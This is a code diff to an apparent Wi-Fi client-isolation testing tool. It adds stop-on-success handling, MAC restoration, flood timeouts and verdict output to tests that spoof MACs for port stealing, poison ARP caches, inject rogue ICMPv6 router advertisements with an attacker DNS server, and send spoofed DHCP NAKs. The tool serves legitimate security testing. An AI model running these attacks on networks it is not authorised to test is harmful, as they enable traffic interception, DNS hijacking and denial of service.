@@ -963,7 +963,11 @@ class Client2Client:
 	def __init__(self, options):
 		self.options = options
 		self.poc = options.poc
+		# Remember the attacker iface's real MAC so we can restore it on exit
+		# (port-steal spoofs it to the victim's / gateway's MAC).
+		self._orig_attacker_mac = None
 		if self.options.c2c_port_steal is not None:
+			self._orig_attacker_mac = get_macaddress(self.options.c2c)
 			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
 		if not self.poc:
 			self.sup_victim = Supplicant(options.iface, options)
@@ -973,6 +977,8 @@ class Client2Client:
 			self.sup_attacker = Supplicant(options.c2c, options)
 		self.forward_ip = False
 		self.forward_ethernet = False
+		self.port_steal_success = False
+		self._nak_xid = getattr(options, "gtk_inject_dhcp_xid", 0) or 0
 		self.bssid_victim = None
 		self.freq_victim = None
 		self.bssid_attacker = None
@@ -988,6 +994,14 @@ class Client2Client:
 			except Exception:
 				pass
 			self._cap_proc = None
+		# Restore the attacker iface's real MAC if port-steal spoofed it.
+		if getattr(self, "_orig_attacker_mac", None):
+			try:
+				set_macaddress(self.options.c2c, self._orig_attacker_mac)
+				log(STATUS, f"Restored attacker MAC to {self._orig_attacker_mac}.")
+			except Exception:
+				pass
+			self._orig_attacker_mac = None
 		if not self.poc:
 			self.sup_victim.stop()
 		self.sup_attacker.stop()
@@ -1006,13 +1020,27 @@ class Client2Client:
 			self.forward_ethernet = True
 			log(STATUS, f">>> Client to client traffic at Ethernet layer is allowed ({identities}).", color="red")
 		elif b"icmp_ping_test" in raw(eth):
+			# The GTK-forged ICMP crossed to the victim -> isolation bypassed. Mark
+			# it so the test stops immediately (same as every other hit below),
+			# instead of flooding until Ctrl-C / the wall-clock timeout.
+			self.forward_ethernet = True
 			log(STATUS, f">>> GTK wrapping ICMP ping is allowed ({identities}).", color="red")
 		elif b"broadcast_reflection" in raw(eth):
+			self.forward_ethernet = True
 			log(STATUS, f">>> Broadcast Reflection is allowed ({identities}).", color="red")
 		elif b"multicast_reflection" in raw(eth):
+			self.forward_ethernet = True
 			log(STATUS, f">>> Multicast Reflection is allowed ({identities}).", color="red")
+		elif self.options.c2c_ra_inject is not None and ICMPv6ND_RA in eth and ICMPv6NDOptRDNSS in eth \
+			and self.options.ra_inject_dns in [str(d) for d in eth[ICMPv6NDOptRDNSS].dns]:
+			# Our rogue ICMPv6 RA (matched by its attacker-controlled RDNSS) was
+			# received on the victim's interface -> the spoofed RA crossed client
+			# isolation and can swap the victim's IPv6 DNS resolver.
+			self.forward_ethernet = True
+			log(STATUS, f">>> Rogue ICMPv6 RA reached the victim (RDNSS={self.options.ra_inject_dns}): "
+			            f"IPv6 RA/DNS injection NOT isolated ({identities}).", color="red")
 		elif self.options.c2c_dhcp_nak is not None and DHCP in eth and BOOTP in eth \
-			and eth[BOOTP].xid == (getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0) \
+			and eth[BOOTP].xid == getattr(self, "_nak_xid", getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0) \
 			and any(isinstance(o, tuple) and o[0] == "message-type" and o[1] in (6, "nak")
 			        for o in eth[DHCP].options):
 			# Our spoofed plaintext DHCP NAK (matched by its injected XID) was
@@ -1028,15 +1056,21 @@ class Client2Client:
 			self.forward_ethernet = True
 			log(STATUS, f">>> Client to client traffic at Ethernet (ARP poisoning) layer is allowed ({identities}).", color="red")
 
-		#if self.forward_ethernet and (not self.options.c2c_ip or self.forward_ip):
-		#	quit(1)
+		# Stop the whole test the instant a vulnerable condition is detected --
+		# any marked frame reached the victim. Every sender/wait loop polls
+		# test_finished and halts immediately.
+		if self.forward_ethernet or self.forward_ip:
+			self.test_finished = True
 
 	def monitor_eth_port_steal(self, eth):
 		#log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
 
 		if (ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890") or (UDP in eth and eth[UDP].sport == self.options.iperf_port) :
 			log(STATUS, f">>> Downlink port stealing is successful.", color="red")
-			
+			# Detected -> stop the flood immediately (both the sender loop and the
+			# event loops key off these).
+			self.port_steal_success = True
+			self.test_finished = True
 			if self.options.reinject_reflection:
 				self.reinject_frame_via_broadcast_reflection(eth)
 			elif self.options.reinject_gtk:
@@ -1093,6 +1127,8 @@ class Client2Client:
 	def monitor_eth_port_steal_uplink(self, eth):
 		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"uplink_steal_test" :
 			log(STATUS, f">>> Uplink port stealing is successful.", color="red")
+			self.port_steal_success = True
+			self.test_finished = True
 
 	def _gtk_pn_state_path(self, bssid):
 		# Per-BSSID file remembering the highest GTK injection PN used, so
@@ -1115,6 +1151,27 @@ class Client2Client:
 		except Exception:
 			pass
 
+	def _finish_c2c_test(self, label, flag="forward_ethernet"):
+		# Shared tail for the plaintext forwarding-plane tests (c2c-ip/-eth/
+		# -broadcast/-multicast): wait briefly for the victim's monitor to catch
+		# the frame, print an explicit RESULT verdict, and -- only with
+		# --auto-exit -- end the test so run() returns without a manual Ctrl-C.
+		# `flag` is the detection attribute monitor_eth sets when the marked
+		# frame is received: forward_ethernet for L2 tests, forward_ip for the
+		# gateway-bouncing (c2c-ip) test.
+		identities = (f"{self.sup_victim.victim().id} to {self.sup_victim.victim().id}"
+		              if self.options.same_id
+		              else f"{self.sup_attacker.attacker().id} to {self.sup_attacker.victim().id}")
+		_dl = time.time() + (getattr(self.options, "c2c_wait", 4) or 4)
+		while time.time() < _dl and not getattr(self, flag):
+			time.sleep(0.1)
+		if getattr(self, flag):
+			log(STATUS, f">>> RESULT: {label} reached the victim -- guest-to-guest L2 is NOT isolated ({identities}).", color="red")
+		else:
+			log(STATUS, f">>> RESULT: {label} never reached the victim -- client isolation appears to BLOCK it ({identities}).", color="green")
+		if getattr(self.options, "auto_exit", False):
+			self.test_finished = True
+
 	def send_c2c_frame(self):
 		# Option one: test forwarding at the IP level. send_eth will add Ethernet header.
 		if self.options.c2c_ip is not None:
@@ -1125,6 +1182,7 @@ class Client2Client:
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.routermac)/ip/Raw(b"forward_ip")
 			log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p)} (Ethernet destination is the victim's gateway/router)")
 			self.sup_attacker.send_eth(p)
+			self._finish_c2c_test("Gateway bouncing (c2c-ip)", flag="forward_ip")
 
 		# Option two: test forwarding at the Ethernet level
 		elif self.options.c2c_eth is not None:
@@ -1135,33 +1193,45 @@ class Client2Client:
 			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
 			for _ in range(10):
 				self.sup_attacker.send_eth(p)
+			self._finish_c2c_test("Ethernet unicast (c2c-eth)")
 
 		# Option three: test port stealing by letting the attacker to send a lot of layer-2 frames with src addr as the victim. 
 		elif self.options.c2c_port_steal is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker to attacker's addr:       {repr(p)} (Ethernet destination is the attacker's addr)")
-			for _ in range(100000000):
+			# Short bursts, checked often, so the flood STOPS the moment the
+			# receiver thread sets test_finished (success) -- no need to keep
+			# blasting. Self-caps at --port-steal-timeout so a non-vulnerable
+			# network doesn't flood forever either.
+			maxdur = getattr(self.options, "port_steal_timeout", 30) or 30
+			start = time.time()
+			while not self.test_finished and (time.time() - start) < maxdur:
 				if self.attacker_connected:
-					sendpfast(p, pps=1000000, iface=self.options.c2c_port_steal, loop=1000000)
-					#self.sup_attacker.send_eth(p)
-					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
-				time.sleep(1)
-				if self.test_finished:
-					break
-			log(STATUS, f"Finished sending 1000000 frames.")
+					sendpfast(p, pps=100000, iface=self.options.c2c_port_steal, loop=2000)
+				time.sleep(0.1)
+			if self.port_steal_success:
+				log(STATUS, f">>> RESULT: downlink port stealing SUCCEEDED -- the victim's downlink was redirected to the attacker (NOT isolated).", color="red")
+			else:
+				log(STATUS, f">>> RESULT: downlink port stealing did NOT succeed within {maxdur}s -- appears blocked.", color="green")
+			self.test_finished = True
 
 		# Option four: test port stealing (uplink) by letting the attacker send a lot of layer-2 frames with src addr as the victim's gateway. 
 		elif self.options.c2c_port_steal_uplink is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's gateway MAC addr. 
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker (gateway MAC address) to himself:       {repr(p)} (Ethernet destination is the attacker's addr)")
-			for _ in range(1000000):
+			maxdur = getattr(self.options, "port_steal_timeout", 30) or 30
+			start = time.time()
+			while not self.test_finished and (time.time() - start) < maxdur:
 				if self.attacker_connected:
 					self.sup_attacker.send_eth(p)
-					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
-				time.sleep(0.001)
-			log(STATUS, f"Finished sending 1000000 uplink stealing frames.")
+				time.sleep(0.005)
+			if self.port_steal_success:
+				log(STATUS, f">>> RESULT: uplink port stealing SUCCEEDED -- the victim's uplink was redirected to the attacker (NOT isolated).", color="red")
+			else:
+				log(STATUS, f">>> RESULT: uplink port stealing did NOT succeed within {maxdur}s -- appears blocked.", color="green")
+			self.test_finished = True
 
 		elif self.options.c2c_broadcast is not None:
 			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
@@ -1169,6 +1239,7 @@ class Client2Client:
 			log(STATUS, f"Sending Ethernet layer packet from attacker to ff:ff:ff:ff:ff:ff: {repr(p)} (Ethernet destination is the ff:ff:ff:ff:ff:ff)")
 			for _ in range(10):
 				self.sup_attacker.send_eth(p)
+			self._finish_c2c_test("Broadcast reflection (c2c-broadcast)")
 
 		elif self.options.c2c_multicast is not None:
 			mcast_mac = self.options.mcast_mac
@@ -1177,6 +1248,7 @@ class Client2Client:
 			log(STATUS, f"Sending Ethernet layer packet from attacker to {mcast_mac}: {repr(p)} (Ethernet destination is the multicast MAC)")
 			for _ in range(10):
 				self.sup_attacker.send_eth(p)
+			self._finish_c2c_test("Multicast reflection (c2c-multicast)")
 
 		elif self.options.c2c_ra_inject is not None:
 			# ICMPv6 RA injection: a client on the attacker's (e.g. guest) network
@@ -1203,6 +1275,20 @@ class Client2Client:
 			log(STATUS, f">>> ICMPv6 RA injected toward ff02::1 with RDNSS={evil_dns}. "
 			            f"Check the victim's resolver ('resolvectl status' / 'ip -6 route') "
 			            f"to confirm whether it adopted the attacker's DNS server.", color="red")
+			# Verdict (did the RA frame reach the victim) + resolver proof.
+			self._finish_c2c_test("IPv6 RA injection (c2c-ra-inject)")
+			if self.forward_ethernet:
+				try:
+					proof = subprocess.run(
+						["bash", "-c", "resolvectl status 2>/dev/null; cat /etc/resolv.conf /run/systemd/resolve/resolv.conf 2>/dev/null"],
+						capture_output=True, text=True, timeout=5).stdout
+					if evil_dns in proof:
+						log(STATUS, f">>> PROOF: rogue RDNSS {evil_dns} is now present in the victim's resolver config.", color="red")
+					else:
+						log(STATUS, f">>> NOTE: RA was delivered to the victim, but the rogue RDNSS is not in the resolver "
+						            f"(victim may have no IPv6, or accept_ra/RDNSS handling is off). Confirm with 'resolvectl status'.", color="green")
+				except Exception:
+					pass
 
 		elif self.options.c2c_dhcp_nak is not None:
 			# Plaintext DHCP NAK for OPEN / captive-portal guest SSIDs (no GTK).
@@ -1216,9 +1302,21 @@ class Client2Client:
 			# the victim drops its lease (connectivity DoS).
 			#
 			# A NAK is normally only honoured when its XID matches the victim's
-			# in-flight DHCP request, which we do not know here -- capture it and
-			# pass it with --gtk-inject-dhcp-xid.
-			xid        = getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0
+			# in-flight DHCP request. In the self-test the victim is our own
+			# station, so --dhcp-nak-xid-auto reuses its learned DHCP XID exactly;
+			# otherwise fall back to the XID given with --gtk-inject-dhcp-xid
+			# (capture a real client's with: tcpdump -nv 'udp port 67 or 68').
+			xid = getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0
+			if getattr(self.options, "dhcp_nak_xid_auto", False):
+				vxid = getattr(self.sup_victim, "dhcp_xid", None) if self.sup_victim else None
+				if vxid:
+					xid = vxid
+					log(STATUS, f">>> Auto-XID: using the victim's learned DHCP XID 0x{xid:x} for the NAK.", color="green")
+				else:
+					log(WARNING, ">>> --dhcp-nak-xid-auto: could not learn the victim's XID "
+					             "(--poc mode or no DHCP seen yet); falling back to --gtk-inject-dhcp-xid.")
+			# Remember the XID actually injected so the victim-side matcher keys on it.
+			self._nak_xid = xid
 			router_ip  = self.sup_victim.routerip
 			victim_mac = self.sup_victim.mac
 			rawmac     = bytes.fromhex(victim_mac.replace(":", ""))
@@ -1234,12 +1332,15 @@ class Client2Client:
 			            f"to {dst_mac}: {repr(p)} (Ethernet destination is "
 			            f"{'broadcast' if self.options.dhcp_nak_broadcast else 'the victim'})")
 			for _ in range(self.options.dhcp_nak_count):
+				if self.forward_ethernet:   # NAK already reached victim -> stop at once
+					break
 				self.sup_attacker.send_eth(p)
-			# Give the victim's monitor a brief window to catch the NAK (if the
-			# AP delivers it) and then end the test cleanly, so run() prints the
-			# RESULT verdict without needing a manual Ctrl-C.
-			time.sleep(getattr(self.options, "dhcp_nak_wait", 4) or 4)
-			if getattr(self.options, "auto_exit", False):
+			# Brief detection window, but stop the instant the NAK lands.
+			_dl = time.time() + (getattr(self.options, "dhcp_nak_wait", 4) or 4)
+			while time.time() < _dl and not self.forward_ethernet:
+				time.sleep(0.1)
+			# Stop immediately on a hit; otherwise obey --auto-exit.
+			if self.forward_ethernet or getattr(self.options, "auto_exit", False):
 				self.test_finished = True
 			log(STATUS, f">>> Plaintext DHCP NAK sent {self.options.dhcp_nak_count}x "
 			            f"(server_id={router_ip}, xid={xid}). If client isolation does not "
@@ -1503,9 +1604,13 @@ class Client2Client:
 			nburst = getattr(self.options, "arp_poison_count", 100) or 100
 			log(STATUS, f"Sending {nburst}x poisoned ARP from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
 			for _ in range(nburst):
+				if self.forward_ethernet:   # poison already reached victim -> stop at once
+					break
 				self.sup_attacker.send_eth(p)
 				time.sleep(0.05)
-			time.sleep(1.0)
+			_dl = time.time() + 1.5
+			while time.time() < _dl and not self.forward_ethernet:
+				time.sleep(0.1)
 			after = _victim_neigh()
 			log(STATUS, f">>> PROOF: victim {vif} ARP cache for gateway {gw} AFTER:  {after}", color="red")
 			log(STATUS, f">>>        (attacker MAC = {self.sup_attacker.mac}, real gateway MAC = {self.sup_victim.routermac})", color="red")
@@ -1676,6 +1781,8 @@ class Client2Client:
 		if self.options.c2c_port_steal_uplink is not None:
 			# In PoC mode, before running this script, the attacker has to set it's mac address to routermac. 
 			if self.options.poc is not True:
+				if getattr(self, "_orig_attacker_mac", None) is None:
+					self._orig_attacker_mac = get_macaddress(self.options.c2c)
 				set_macaddress(self.options.c2c, self.sup_victim.routermac)
 			self.sup_attacker = Supplicant(self.options.c2c, self.options)
 
@@ -1693,23 +1800,25 @@ class Client2Client:
 		# [ Send a packet from the attacker to the victim ]
 
 		# Thread 1 is to let attacker send testing packets like C2C IP packets or C2C ethernet frames, or do port stealing.
-		thread1 = threading.Thread(target=self.send_c2c_frame)
-		# Thread 2 is to let victim monitor received packets. 
+		# daemon=True so a Ctrl-C (which hits the main thread at join below) tears
+		# these down instead of leaving the flood running in the background.
+		thread1 = threading.Thread(target=self.send_c2c_frame, daemon=True)
+		# Thread 2 is to let victim monitor received packets.
 		if not (self.options.poc and self.options.c2c_port_steal):
-			thread2 = threading.Thread(target=self.start_monitor)
+			thread2 = threading.Thread(target=self.start_monitor, daemon=True)
 
-		# Thread 4 is to let attacker monitor received packets. 
+		# Thread 4 is to let attacker monitor received packets.
 		if self.options.c2c_port_steal is not None:
-			thread4 = threading.Thread(target=self.start_attacker_receiver)
+			thread4 = threading.Thread(target=self.start_attacker_receiver, daemon=True)
 		elif self.options.c2c_port_steal_uplink is not None:
-			thread4 = threading.Thread(target=self.start_attacker_receiver2)
-			
-		# Thread 3 is to let victim continuously send sample traffic like ICMP Echo. 
+			thread4 = threading.Thread(target=self.start_attacker_receiver2, daemon=True)
+
+		# Thread 3 is to let victim continuously send sample traffic like ICMP Echo.
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None:
-				thread3 = threading.Thread(target=self.send_uplink_frame)
+				thread3 = threading.Thread(target=self.send_uplink_frame, daemon=True)
 			elif self.options.c2c_port_steal_uplink is not None:
-				thread3 = threading.Thread(target=self.send_uplink_frame2)
+				thread3 = threading.Thread(target=self.send_uplink_frame2, daemon=True)
 				
 		if not (self.options.poc and self.options.c2c_port_steal):
 			thread2.start()
@@ -1722,14 +1831,23 @@ class Client2Client:
 				thread3.start()
 
 
-		thread1.join()
-		if not (self.options.poc and self.options.c2c_port_steal):
-			thread2.join()
-		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-			thread4.join()
-		if not self.options.poc:
+		# A Ctrl-C arrives in THIS (main) thread. Catch it and signal the worker
+		# threads via test_finished so their loops exit promptly, instead of
+		# leaving a flood running. The threads are daemons, so even a stuck
+		# tcpreplay subprocess won't outlive the process.
+		try:
+			thread1.join()
+			if not (self.options.poc and self.options.c2c_port_steal):
+				thread2.join()
 			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
-				thread3.join()
+				thread4.join()
+			if not self.options.poc:
+				if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+					thread3.join()
+		except KeyboardInterrupt:
+			log(STATUS, ">>> Ctrl-C: stopping test (signalling worker threads).", color="green")
+			self.test_finished = True
+			time.sleep(0.5)
 
 
 		# Identity output to use
@@ -1908,7 +2026,9 @@ def main():
 	parser.add_argument("--dhcp-nak-count", default=10, type=int, help="Number of times to send the spoofed DHCP NAK in the --c2c-dhcp-nak test (default: 10).")
 	parser.add_argument("--dhcp-nak-broadcast", default=False, action="store_true", help="Send the --c2c-dhcp-nak frame to the L2 broadcast address (ff:ff:ff:ff:ff:ff) instead of unicast to the victim's MAC. Use when the victim ignores unicast NAKs or to mimic a broadcast DHCP server reply.")
 	parser.add_argument("--dhcp-nak-wait", default=4, type=float, help="Seconds to wait after sending the --c2c-dhcp-nak frames for the victim's monitor to catch a delivered NAK before printing the RESULT verdict (default: 4).")
+	parser.add_argument("--dhcp-nak-xid-auto", default=False, action="store_true", help="For --c2c-dhcp-nak: automatically use the victim's own learned DHCP XID (so the NAK can actually be honoured) instead of --gtk-inject-dhcp-xid. Works in the self-test where the victim is our station; in --poc mode it falls back to --gtk-inject-dhcp-xid (capture a real client's XID with: tcpdump -nv 'udp port 67 or 68').")
 	parser.add_argument("--auto-exit", default=False, action="store_true", help="For the --c2c (ARP poisoning) and --c2c-dhcp-nak tests: end the test automatically after the detection window and print the verdict, instead of staying connected until Ctrl-C. Default: keep running (sustained MITM / manual inspection).")
+	parser.add_argument("--port-steal-timeout", default=30, type=int, help="Max seconds to flood during --c2c-port-steal / --c2c-port-steal-uplink before giving up. The flood stops immediately when success is detected; this just caps the no-success case (default: 30).")
 	parser.add_argument("--arp-poison-count", default=100, type=int, help="Number of spoofed ARP replies to send (0.05s apart) in the --c2c ARP-poisoning test before re-reading the victim's ARP cache (default: 100). Increase if the victim's cache does not flip.")
 	parser.add_argument("--c2m", help="Second interface to test client-to-monitor traffic.")
 	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
